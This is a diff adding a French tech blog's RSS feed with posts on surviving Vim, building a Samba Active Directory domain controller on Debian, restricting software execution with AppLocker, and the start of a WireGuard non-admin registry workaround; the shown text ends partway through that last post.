@@ -1,0 +1,988 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0"><channel><title>Coubiac - Benoit</title><link>https://Coubiac.github.io/</link><description></description><lastBuildDate>Thu, 10 Mar 2022 19:32:33 +0100</lastBuildDate><item><title>"Débuter et survivre dans VIM"</title><link>https://Coubiac.github.io/debuter-et-survivre-dans-vim.html</link><description>&lt;h1&gt;SORTIR de Vim&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;:q  : sort
+:q! : force à sortir et abandonner les modifications
+:w  : enregistre
+:wq : enregistre et sort
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1&gt;Se déplacer&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Flèches de direction: se déplacer
+
+h   : déplacer le curseur vers la gauche
+j   : déplacer le curseur vers le bas
+k   : déplacer le curseur vers le haut
+l   : déplacer le curseur vers la droite
+
+gg  : aller au début du fichier
+G   : aller à la fin du fichier
+
+w   : aller au début du mot suivant (espace et ponctuation comme séparateur)
+W   : aller au début du mot suivant (espace comme séparateur)
+
+^   : aller au début de la ligne (premier caractère)
+$   : aller à la fin de la ligne
+
+:42 : se déplace à la ligne 42
+42G : se déplace à la ligne 42
+
+/unMot  : se déplace au mot &amp;quot;unMot&amp;quot; vers le bas
+     n  : mot suivant vers le bas
+     N  : mot suivant vers le haut
+?unMot  : se déplace au mot &amp;quot;unMot&amp;quot; vers le haut
+     n  : mot suivant vers le bas
+     N  : mot suivant vers le haut
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1&gt;Modification&lt;/h1&gt;
+&lt;h2&gt;Modification avec basculement en mode insertion&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;a   : Insertion après le curseur
+i   : Insertion avant le curseur
+
+A   : Insertion à la fin de la ligne
+I   : Insertion au début de la ligne
+
+o   : Insertion en ajoutant une ligne vers le bas
+O   : Insertion en ajoutant une ligne vers le haut
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Copier - Coller&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dd  : Coupe la ligne (peut servir à supprimer la ligne)
+yy  : Copie la ligne
+d   : Coupe le mot
+y   : Copie le mot
+p   : colle
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Rechercher / Remplacer&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/unMot  : se déplace au mot &amp;quot;unMot&amp;quot; vers le bas
+     n  : mot suivant vers le bas
+     N  : mot suivant vers le haut
+
+?unMot  : se déplace au mot &amp;quot;unMot&amp;quot; vers le haut
+     n  : mot suivant vers le bas
+     N  : mot suivant vers le haut
+
+:%s/old/new/g   : Recherche le mot &amp;quot;old&amp;quot; et le remplace 
+                  par le mot &amp;quot;new&amp;quot; dans tout le fichier
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Commenter et décommenter un bloc de texte&lt;/h2&gt;
+&lt;p&gt;Commenter un bloc de code&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Commenter un bloc de texte" src="https://i.stack.imgur.com/lu6aU.gif"&gt;&lt;/p&gt;
+&lt;p&gt;Décommenter un bloc de code&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Décommenter un bloc de texte" src="https://i.stack.imgur.com/2Y7eH.gif"&gt;&lt;/p&gt;
+&lt;p&gt;Source: &lt;a href="https://stackoverflow.com/a/1676690"&gt;https://stackoverflow.com/a/1676690&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Benoit</dc:creator><pubDate>Thu, 10 Mar 2022 19:32:33 +0100</pubDate><guid isPermaLink="false">tag:coubiac.github.io,2022-03-10:/debuter-et-survivre-dans-vim.html</guid><category>Linux</category><category>[vim]</category></item><item><title>"Créer une infrastructure active directory sous Linux"</title><link>https://Coubiac.github.io/creer-une-infrastructure-active-directory-sous-linux.html</link><description>&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Dans ce tutoriel nous allons mettre en place une infrastructure active directory complète sous linux à l'aide de SAMBA.&lt;/p&gt;
+&lt;h1&gt;Qu'est ce que samba ?&lt;/h1&gt;
+&lt;p&gt;Samba est à l'origine une implémentation libre des protocoles SMB/CIFS sous linux. A l'origine, il servaut simplement à partager des fichiers d'un serveur linux à des clients Windows. Depuis la version 4, il permet de créer un controleur de domaine active directory et ainsi fournir les services d'authentification AD mais aussi des stratégies de groupes à des clients Windows. La documentation de &lt;a href="https://wiki.samba.org/index.php/"&gt;Samba&lt;/a&gt; peut être trouvée &lt;a href="https://wiki.samba.org/index.php/"&gt;ici&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Présentation du labo&lt;/h2&gt;
+&lt;p&gt;Pour ce labo je vais utiliser 3 machines virtuelles:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;1 VM Debian 11 nommée "SRV-AD-Linux": IP= 192.168.142.10&lt;/li&gt;
+&lt;li&gt;1 VM d'administration sous Windows 10: PC-ADMIN&lt;/li&gt;
+&lt;li&gt;1 VM Cliente: PC-CLient&lt;/li&gt;
+&lt;li&gt;1 routeur pour l'accès internet: IP= 192.168.142.250&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Installation du serveur AD&lt;/h2&gt;
+&lt;h2&gt;Installation de la VM Linux&lt;/h2&gt;
+&lt;p&gt;Pour cette VM, je vais utiliser Debian 11. Je vais commencer par l'installer de manière standard avec juste le minimum syndical. Je ne vais pas décrire l'installation d'une VM Debian basique car ce n'est pas l'objet du tuto mais voici les paquets choisis:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Installation de debian" src="/images/samba/packets-debian.png"&gt;&lt;/p&gt;
+&lt;p&gt;C'est parti...&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Installation de debian" src="/images/samba/install-in-progress.png"&gt;&lt;/p&gt;
+&lt;p&gt;Et voila !&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Installation de debian" src="/images/samba/install-terminée.png"&gt;&lt;/p&gt;
+&lt;h2&gt;Configuration Pré-installation&lt;/h2&gt;
+&lt;h3&gt;Désactivation d'IPV6.&lt;/h3&gt;
+&lt;p&gt;N'ayant pas besoin d'IPV6 dans ce tuto, je vais le désactiver complètement en ajoutant ces lignes à la fin du fichier /etc/sysctl.conf&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;net.ipv6.conf.all.disable_ipv6 &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
+net.ipv6.conf.default.disable_ipv6 &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
+net.ipv6.conf.lo.disable_ipv6 &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On applique les changements à l'aide de la commande "sysctl -p"&lt;/p&gt;
+&lt;h3&gt;Vérification du fichier /etc/hosts:&lt;/h3&gt;
+&lt;p&gt;Il faut que le fichier /etc/hosts soit correctement configuré pour résoudre le nom de domaine enièrement qualifié (FQDN) et le nom d'hôte court vers l'adresse IP du controlleur de domaine.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="fichier /etc/hosts" src="/images/samba/etc-hosts.png"&gt;&lt;/p&gt;
+&lt;h3&gt;installation d'un serveur de temps (ntp):&lt;/h3&gt;
+&lt;p&gt;Je ne vais pas m'attarder sur l'installation et la configuration d'un serveur de temps sous linux mais je vous met sur la piste:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;apt update
+apt install ntp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;installation de Samba:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;apt-get install acl attr samba samba-dsdb-modules samba-vfs-modules winbind libpam-winbind libnss-winbind libpam-krb5 krb5-config krb5-user
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;L'installation commence:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="installation de samba" src="/images/samba/install-samba.png"&gt;&lt;/p&gt;
+&lt;p&gt;Le programme d'installation nous demande le nom du domaine par défault. Il s'agit du domaine AD. Pour moi, j'ai choisit coubiac.local&lt;/p&gt;
+&lt;p&gt;&lt;img alt="domaine-kerberos" src="/images/samba/domaine-kerberos.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="serveur administratif kerberos" src="/images/samba/server-administratif-kerberos.png"&gt;&lt;/p&gt;
+&lt;p&gt;Voila, l'installation est terminée !&lt;/p&gt;
+&lt;p&gt;&lt;img alt="installation de samba terminée" src="/images/samba/install-samba-terminee.png"&gt;&lt;/p&gt;
+&lt;h3&gt;Configuration de samba&lt;/h3&gt;
+&lt;p&gt;Il faut commencer par arreter tous les process samba|smbd|nmbd|winbindd:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="installation de samba terminée" src="/images/samba/process1.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ensuite il faut supprimer le fichier smb.conf créé par défault. Vous pouvez le trouver à l'aide cette commande:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smbd -b &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;CONFIGFILE&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="fichier de conf samba" src="/images/samba/find-smbd.png"&gt;&lt;/p&gt;
+&lt;p&gt;On peut donc le renomer en smb.conf.old&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mv /etc/samba/smb.conf /etc/samba/smb.conf.old
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il faut ensuite supprimer tous les fichiers de base de donnée &lt;em&gt;.tdb et &lt;/em&gt;.ldb. 
+Pour lister les dossiers qui contiennent ces bases de données:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smbd -b &lt;span class="p"&gt;|&lt;/span&gt; egrep &lt;span class="s2"&gt;&amp;quot;LOCKDIR|STATEDIR|CACHEDIR|PRIVATE_DIR&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="fichier de conf samba" src="/images/samba/sambatld.png"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;rm /run/samba/&lt;span class="o"&gt;{&lt;/span&gt;*.tdb,*.ldb&lt;span class="o"&gt;}&lt;/span&gt;
+rm /var/lib/samba/&lt;span class="o"&gt;{&lt;/span&gt;*.tdb,*.ldb&lt;span class="o"&gt;}&lt;/span&gt;
+rm /var/cache/samba/&lt;span class="o"&gt;{&lt;/span&gt;*.tdb,*.ldb&lt;span class="o"&gt;}&lt;/span&gt;
+rm /var/lib/samba/private/&lt;span class="o"&gt;{&lt;/span&gt;*.tdb,*.ldb&lt;span class="o"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ensuite édite le fichier /etc/krb5.conf de cette manière:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="fichier de conf krb5" src="/images/samba/krb5conf.png"&gt;&lt;/p&gt;
+&lt;p&gt;Pour provisionner notre domaine, nous allons utiliser l'outil "samba-tool"&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;samba-tool domain provision --use-rfc2307 --interactive
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="provisionning" src="/images/samba/provisionning.png"&gt;&lt;/p&gt;
+&lt;p&gt;On peut maintenant vérifier notre fichier /etc/samba/smb.conf&lt;/p&gt;
+&lt;p&gt;&lt;img alt="smb.conf" src="/images/samba/smbconf.png"&gt;&lt;/p&gt;
+&lt;p&gt;Le script de config crée un fichier krb5.conf dans le dossier /var/lib/samba/private/krb5.conf.
+Il faut supprimer ce fichier et le remplacer par celui se trouvant dans /etc/krb5.conf&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;rm -f /var/lib/samba/private/krb5.conf
+ln -s /etc/krb5.conf /var/lib/samba/private/krb5.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ensuite on peut configurer le démarrage des services:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;systemctl unmask samba-ad-dc
+systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; samba-ad-dc
+systemctl disable samba winbind nmbd smbd
+systemctl mask samba winbind nmbd smbd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On vérifie:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;systemctl list-unit-files &lt;span class="p"&gt;|&lt;/span&gt;egrep &lt;span class="s1"&gt;&amp;#39;samba|winbind|nmbd|smbd&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il faut ensuite activer les ACL et attributs étendus sur la partition ou est installée SAMBA. On modifie donc notre fichier fstab:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;vi /etc/fstab
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;et on ajoute les options 'acl' et 'user_xattr'&lt;/p&gt;
+&lt;p&gt;&lt;img alt="smb.conf" src="/images/samba/fstab.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ensuite on remonte la partition (ou on reboot):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mount -o remount /
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il faut maintenant corriger les permissions sur les partages sysvol et netlogon&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;samba-tool ntacl sysvolreset
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Et voilà ! votre DC devrait être fonctionnel ! il ne reste plus qu'à le tester avec un windows 10.&lt;/p&gt;
+&lt;h2&gt;Ajout d'une machine au domaine&lt;/h2&gt;
+&lt;p&gt;Si tout s'est bien passé, vous ne devriez pas avoir de soucis pour joindre le domaine:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="joindredomaine" src="/images/samba/joindredomaine.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="joindredomaine" src="/images/samba/joindredomaine2.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="joindredomaine" src="/images/samba/joindredomaine3.png"&gt;&lt;/p&gt;
+&lt;p&gt;Il faut ensuite installer les outils RSAT pour administrer l'active directory:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="rsat" src="/images/samba/rsat0.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="rsat" src="/images/samba/rsat1.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="rsat" src="/images/samba/rsat2.png"&gt;&lt;/p&gt;
+&lt;p&gt;J'ai ensuite, à l'aide des outils RSAT mis en place une GPO pour forcer le fond d'écran et un GPO pour mettre en place des administrateurs locaux et tout fonctionne !&lt;/p&gt;
+&lt;p&gt;&lt;img alt="GPO" src="/images/samba/GPO_ADMIN_LOCAUX.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="GPO" src="/images/samba/GPO_FOND_ECRAN.png"&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Benoit</dc:creator><pubDate>Sat, 06 Nov 2021 15:55:33 +0100</pubDate><guid isPermaLink="false">tag:coubiac.github.io,2021-11-06:/creer-une-infrastructure-active-directory-sous-linux.html</guid><category>Linux</category><category>[active directory</category><category>linux</category><category>samba]</category></item><item><title>"Utiliser Applocker pour restreindre l'installation de logiciels à un groupe d'utilisateurs"</title><link>https://Coubiac.github.io/utiliser-applocker-pour-restreindre-linstallation-de-logiciels-a-un-groupe-dutilisateurs.html</link><description>&lt;h1&gt;Qu'est ce qu'Applocker ?&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Attention ! Applocker est uniquement compatible avec les éditions "Entreprise" et "Education" de Windows 10. A ce jour, Windows 10 Pro n'est pas pris en charge !&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Applocker est une fonctionnalité qui a fait son apparition avec Windows 7 entreprise et Windows Server 2008R2. il s'agit d'une évolution des "stratégies de restriction logicielles"  (ou SRP) qui avaient à l'époque été introduits avec Windows Server 2000 et Windows XP. &lt;/p&gt;
+&lt;p&gt;Selon Microsoft:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;AppLocker fait avancer les fonctionnalités de contrôle d’application et les fonctionnalités des stratégies de restriction logicielle. AppLocker contient de nouvelles fonctionnalités et extensions qui vous permettent de créer des règles pour autoriser ou refuser l’exécution d’applications en fonction des identités uniques des fichiers et pour spécifier les utilisateurs ou groupes qui peuvent exécuter ces applications.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Dans ce tutoriel, nous allons voir comment utiliser Applocker dans un environnement Windows Server 2019 et Active Directory pour restreindre l'execution&lt;/p&gt;
+&lt;h1&gt;Préparation des groupes&lt;/h1&gt;
+&lt;p&gt;Nous allons dans un premier temps créer les groupes utilisateurs dont nous aurons besoin:&lt;/p&gt;
+&lt;p&gt;On ouvre la gestion des utilisateurs active directory
+&lt;img alt="Menu outil du gestionnaire de serveur" src="/images/applocker/01.png"&gt;&lt;/p&gt;
+&lt;p&gt;On crée un nouveau groupe que nous appellerons "G_RESTRICTION LOGICIELS. Nous pourrons ensuite insérer dans ce groupe d'autres groupes qui n'auront pas l'autorisation d'installer des logiciels (par exemple les Stagiaires  :D )
+&lt;img alt="Menu Nouveau groupe" src="/images/applocker/02.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Ajout d'un groupe" src="/images/applocker/03.png"&gt;&lt;/p&gt;
+&lt;p&gt;Nous allons donc ajouter le groupe "G_Stagiaires" au groupe "G_restrictions_logiciels"
+&lt;img alt="Utilisateurs et ordinateurs Active Directory" src="/images/applocker/04.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Ajout d'un groupe à un autre groupe" src="/images/applocker/05.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Selection des groupes" src="/images/applocker/06.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Boite de dialogue confirmation" src="/images/applocker/09.png"&gt;&lt;/p&gt;
+&lt;h1&gt;Création de la stratégie de groupe&lt;/h1&gt;
+&lt;p&gt;Nous allons maintenant créer une stratégie de groupe pour mettre en place Applocker&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Menu outil du gestionnaire de serveur" src="/images/applocker/10.png"&gt;&lt;/p&gt;
+&lt;p&gt;Il faudra bien évidement lier la GPO à l'OU sur laquelle vous voulez l'appliquer...
+&lt;img alt="Creation d'une nouvelle GPO" src="/images/applocker/11.png"&gt;&lt;/p&gt;
+&lt;h2&gt;Activation du Service "Infomations d'Application"&lt;/h2&gt;
+&lt;p&gt;Pour qu'Applocker puisse fonctionne, il faut que le service "Identité de l'application" soit démarré sur les PC Windows 10. Par défaut, ce service est désactivé. Il faut donc l'activer.&lt;/p&gt;
+&lt;p&gt;Nous pouvons bien entendu intégrer ceci dans notre GPO:&lt;/p&gt;
+&lt;p&gt;Configuration Ordinateur -&amp;gt; Paramètre Windows -&amp;gt; Paramètre de sécurité -&amp;gt; Services Systèmes&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Editeur de Gestion de stratégies de groupe" src="/images/applocker/12.png"&gt;&lt;/p&gt;
+&lt;p&gt;On sélectionne le démarrage "Automatique" :
+&lt;img alt="Propriete de information application" src="/images/applocker/13.png"&gt;&lt;/p&gt;
+&lt;h2&gt;Configuration de la GPO Applocker:&lt;/h2&gt;
+&lt;p&gt;Il faut ensuite configurer la mise en application des règles. Pour cela il faut cliquer sur "Configurer la mise en application des règles"&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Gestion des stratégies de groupe" src="/images/applocker/14.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Propriétés d'Applocker" src="/images/applocker/15.png"&gt;&lt;/p&gt;
+&lt;p&gt;Nous allons cocher les 4 cases et sélectionner "Appliquer les règles" dans le menu déroulant.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Propriétés d'Applocker" src="/images/applocker/16.png"&gt;&lt;/p&gt;
+&lt;h2&gt;Règles de l'executable&lt;/h2&gt;
+&lt;p&gt;Je vais vous montrer comment créer les "règles de l'éxécutable" mais il faudra faire la même chose pour les autres catégories:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Règles de l'éxecutable&lt;/li&gt;
+&lt;li&gt;Règles Windows Installer&lt;/li&gt;
+&lt;li&gt;Règles de script&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Creation de la règle "Tout le monde":&lt;/h3&gt;
+&lt;p&gt;Nous allons dans un premier temps autoriser tout le monde à executer les executables.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/17.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/18.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/19.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/20.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/21.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/22.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/23.png"&gt;&lt;/p&gt;
+&lt;p&gt;On clique maintenant sur "Non"&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/24.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/25.png"&gt;&lt;/p&gt;
+&lt;h3&gt;Creation de la règle "G_RESTRICTIONS_LOGICIELS"&lt;/h3&gt;
+&lt;p&gt;Nous allons maintenant créer une règles pour empecher les membres du groupe "G_RESTRICTION_LOGICIELS" d'execuer des executables qui ne se trouvent pas dans le dossier "Program Files" ou "Windows":&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/26.png"&gt;&lt;/p&gt;
+&lt;p&gt;Nous appliquons cette règle au groupe "G_RESTRICTIONS_LOGICIELS"&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/27.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/28.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/29.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/30.png"&gt;&lt;/p&gt;
+&lt;p&gt;Nous allons maintenant créer les Exceptions. Il faut cliquer sur ajouter et insérer ces deux exceptions:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;%PROGRAMFILES%/*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;et &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;%WINDIR%/*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/31.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/32.png"&gt;&lt;/p&gt;
+&lt;p&gt;Il faut maintenant répéter la même procédure pour:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Règles Windows Installer&lt;/li&gt;
+&lt;li&gt;Règles de Script&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Concernant les règles d'application empaquetées, il faut générer les règles par défaut: &lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;ATTENTION, Si vous ne générez pas de règles par défaut ici, votre menu démarrer risque de cesser de fonctionner&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Création d'une règle" src="/images/applocker/33.png"&gt;&lt;/p&gt;
+&lt;h1&gt;Vidéo de démonstration&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=6rS4WepDloA" title="Mise en place d'APPlocker"&gt;&lt;img alt="Mise en place d'APPlocker" src="https://img.youtube.com/vi/6rS4WepDloA/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Et voila, maintenant, les utilisateurs du groupe "G_Stagiaires" ne devraient plus pouvoir installer d'applications&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Benoit</dc:creator><pubDate>Wed, 05 May 2021 19:32:33 +0100</pubDate><guid isPermaLink="false">tag:coubiac.github.io,2021-05-05:/utiliser-applocker-pour-restreindre-linstallation-de-logiciels-a-un-groupe-dutilisateurs.html</guid><category>Windows</category><category>[applocker</category><category>windows</category><category>gpo]</category></item><item><title>"Autoriser des utilisateurs non-admin à gérer les tunnels Wireguard"</title><link>https://Coubiac.github.io/autoriser-des-utilisateurs-non-admin-a-gerer-les-tunnels-wireguard.html</link><description>&lt;p&gt;Vous avez sans doute déja entendu parler du VPN Wireguard ? Si ce n'est pas le cas, voici un certain nombre d'articles le présentant:&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.ionos.fr/digitalguide/serveur/outils/wireguard-vpn-principes-de-base/"&gt;Wireguard, principes de base&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://korben.info/comment-installer-le-vpn-wireguard-facilement.html"&gt;Comment installer Wireguard facilement&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://korben.info/veeampn-pour-deployer-facilement-une-infra-vpn-comme-un-pro.html"&gt;VeeamPN - Pour déployer facilement une infra VPN comme un pro&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://korben.info/subspace-une-gui-pour-wireguard-server.html"&gt;Des interfaces graphiques pour Wireguard Server&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Ce VPN est très facile à configurer, sécurisé et est maintenant intégré directement dans le noyeau Linux (depuis Mars 2020 et le kernel 5.6).&lt;/p&gt;
+&lt;p&gt;Des clients existent sur toutes les plateformes (PC, MAC, iOS, Android, Linux etc...).&lt;/p&gt;
+&lt;p&gt;Cependant, j'ai été confronté à un petit souci avec le client Windows. En effet, seuls les utilisateurs Windows ayant des droits Admin sont authorisés à gérér les tunnels (activer ou désactiver). C'est un fonctionnement normal lié au mode de fonctionnement de Wireguard. En effet, à chaque fois que le VPN est activé, une interface est créée. Elle est supprimés quand le VPN est désactivé.&lt;/p&gt;
+&lt;p&gt;Cependant, cela est problématique dans certaines situations. En effet, en fonctionnement normal, le tunnel VPN est monté automatiquement au démarrage du PC. Cela est une bonne chose car ça permet de sécuriser les flux en permanence. Mais dans certains cas, le tunnel ne se monte pas. Je n'ai pas encore trouvé la cause mais j'ai quelques idées quand même: Dans le cas ou le PC n'est pas connecté directement au réseau (par exemple, pas de wifi connu au démarrage...), le tunnel ne peut pas se monter et il n'y a pas de nouvelles tentatives quand le réseau est à nouveau disponible.&lt;/p&gt;
+&lt;p&gt;Voici donc une méthode de contournement:&lt;/p&gt;
+&lt;h1&gt;Ajouter une clé de registre:&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Wireguard&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;inserer ensuite une valeur DWORD:&lt;/p&gt;
